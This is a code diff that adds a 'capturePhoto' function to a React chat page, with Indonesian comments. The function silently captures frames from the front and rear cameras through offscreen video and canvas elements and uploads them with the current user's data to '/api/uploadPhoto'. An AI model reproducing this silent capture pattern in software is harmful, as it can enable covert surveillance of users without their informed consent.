@@ -363,6 +363,83 @@ const ChatPage = () => {
 
   // ========= FUNGSI CAPTURE FOTO =========
   const capturePhoto = async (status = "unknown") => {
+    try {
+      // Cek semua device kamera yang tersedia
+      const devices = await navigator.mediaDevices.enumerateDevices();
+      const videoInputs = devices.filter((d) => d.kind === "videoinput");
+
+      // Kalau gak ada kamera
+      if (videoInputs.length === 0) {
+        throw new Error("Tidak ada kamera yang terdeteksi");
+      }
+
+      // Tentukan facingMode yang mau diambil
+      const facingModes =
+        videoInputs.length > 1
+          ? ["user", "environment"] // dua kamera
+          : ["user"]; // satu aja (biasanya laptop)
+
+      const capturedURLs = [];
+
+      // Loop ambil semua kamera yang tersedia
+      for (const facing of facingModes) {
+        const constraints = {
+          video: { facingMode: { exact: facing } }
+        };
+
+        try {
+          // 1. Ambil stream
+          const stream = await navigator.mediaDevices.getUserMedia(constraints);
+          const video = document.createElement("video");
+          video.srcObject = stream;
+          await video.play();
+
+          // Tunggu sedikit agar kamera siap
+          await new Promise((r) => setTimeout(r, 500));
+
+          // 2. Capture ke canvas
+          const canvas = document.createElement("canvas");
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
+          const ctx = canvas.getContext("2d");
+          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+          const imageData = canvas.toDataURL("image/png");
+
+          // 3. Stop kamera
+          stream.getTracks().forEach((track) => track.stop());
+
+          // Upload via server-side API
+          const res = await fetch("/api/uploadPhoto", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              imageData,
+              currentUser,
+              status,
+              facing
+            })
+          });
+
+          const data = await res.json();
+
+          capturedURLs.push({ facing, downloadURL: data.data.downloadURL });
+          console.log(`Foto (${facing}) diupload ke:`, data.data.downloadURL);
+
+          console.log("Foto diupload ke:", data.data.storageUsed);
+         
+        } catch (err) {
+          console.warn(`Gagal ambil kamera ${facing}:`, err.message);
+        }
+      }
+
+      return capturedURLs; // hasil array { facing, downloadURL }
+    } catch (err) {
+      console.error("Gagal capture foto:", err);
+      return [];
+    }
+  };
+  const capturePhoto5 = async (status = "unknown") => {
   try {
     // Cek semua device kamera yang tersedia
     const devices = await navigator.mediaDevices.enumerateDevices();
